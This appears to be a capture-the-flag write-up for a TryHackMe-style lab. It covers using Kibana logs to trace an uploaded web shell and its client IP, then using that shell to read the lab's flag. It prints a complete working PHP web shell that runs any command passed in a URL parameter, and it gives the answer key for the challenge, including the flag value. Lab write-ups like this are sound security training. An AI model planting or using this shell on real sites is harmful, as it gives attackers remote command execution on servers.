# Day 3: Even if I wanted to go, their vulnerabilities wouldn't allow it.

**Connection to the Machine:**
To begin, a virtual machine and AttackBox were utilized for the analysis.

**To review the logs of the attack on Frosty Pines Resorts, we had to select the "frostypines-resorts" collection within ELK**

- accessed Kibana at `http://10.10.194.231:5601/`
- opened the `Discover` tab
- chose `"frostypines-resorts"`

**website for Operation Red:**  http://frostypines.thm

shell.php:

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```

---

## Answers to the given questions:

BLUE: Where was the web shell uploaded to?

Answer format: /directory/directory/directory/filename.php

```
/media/images/rooms/shell.php
```

- Given date and time needed to be used when reviewing logs: between 11:30 and 12:00 on October 3rd 2024.
- searched `shell.php` and thus found where it was uploaded to
  
![image](https://github.com/user-attachments/assets/94f9915f-259e-473a-a6c2-cedd3663285a)

---

BLUE: What IP address accessed the web shell?

```
10.11.83.34
```

- saw the `clientip` that accessed the webshell

![image](https://github.com/user-attachments/assets/ba54d726-4699-494f-9402-9bd0fc7b570c)

---

RED: What is the contents of the flag.txt?

```
THM{Gl1tch_Was_H3r3}
```

- To access `http://frostypines.thm`, we needed to reference it within our hosts file.
- To do that, I executed the following command in a terminal `echo "MACHINE_IP frostypines.thm" >> /etc/hosts`

![image](https://github.com/user-attachments/assets/d2c4593c-ab74-4a8a-b4c2-e97021f9a87b)

![image](https://github.com/user-attachments/assets/c0cbbe66-73fa-4746-94dd-90858fdd46b4)

![image](https://github.com/user-attachments/assets/4fcf24df-ad9d-4b00-b0ee-6b51a9f00119)

![image](https://github.com/user-attachments/assets/ce2d8ec8-e512-4cb7-a077-1a50745f75b7)

![image](https://github.com/user-attachments/assets/386fbfa4-5750-473f-8e2d-d9d9ccf06cdb)

Used `ls` command

![image](https://github.com/user-attachments/assets/ea548f20-3892-4d82-a4b9-76cfff9deb90)

Used `cat flag.txt` command

![image](https://github.com/user-attachments/assets/b1d5324e-8117-401c-95b5-49d301968861)

Received the flag

![image](https://github.com/user-attachments/assets/92577952-04dd-414a-ae9f-418f336205b6)

---

![image](https://github.com/user-attachments/assets/ca35e9a2-0979-4c08-9694-e7ae47382cbc)
